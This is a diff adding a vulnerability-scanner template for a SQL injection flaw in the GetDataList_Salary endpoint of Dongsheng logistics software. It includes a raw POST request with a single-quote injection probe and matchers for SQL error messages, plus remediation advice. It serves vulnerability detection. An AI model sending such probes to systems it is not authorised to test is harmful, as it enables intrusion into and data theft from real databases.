@@ -1,0 +1,39 @@
+id: dongsheng-getdatalist-salary-sql-injection
+
+info:
+  name: 东胜物流 GetDataList_Salary 接口SQL注入漏洞
+  author: bl
+  severity: high
+  description: |
+    东胜物流 /TruckMng/MsWlDriver/GetDataList_Salary 接口未对用户输入进行充分过滤，存在SQL注入漏洞。攻击者可构造恶意参数执行任意SQL语句，导致数据库敏感信息泄露或数据被篡改。
+  reference:
+    - hw2025
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+  tags: 东胜物流软件
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+
+http:
+  - raw:
+      - |
+        POST /TruckMng/MsWlDriver/GetDataList_Salary?_dc=1665626804091&start=0&limit=30&sort=&condition=1*&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Length: 456
+
+        strCwSTARTGID=1'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '附近有语法错误'
+          - 'SqlException'
+        condition: and
+      - type: status
+        status:
+          - 500
